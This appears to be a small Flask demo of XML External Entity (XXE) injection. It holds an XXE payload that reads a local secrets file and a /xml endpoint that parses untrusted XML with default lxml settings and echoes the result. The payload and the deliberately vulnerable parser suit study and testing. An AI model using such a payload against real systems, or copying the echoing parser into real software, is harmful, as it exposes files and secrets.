from lxml import etree # https://lxml.de/parsing.html
from flask import Flask, render_template, request, make_response, redirect

app = Flask(__name__)

payload = b"""<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM 'file://test//secrets.txt'>
]>
<foo>
&xxe;
</foo>"""

@app.route('/xml', methods=['POST'])
def xml():
    xml = request.get_data()
    parser = etree.XMLParser()
    doc = etree.fromstring(xml, parser)
    parsed_xml = etree.tostring(doc)
    return parsed_xml

#https://github.com/payloadbox/xxe-injection-payload-list
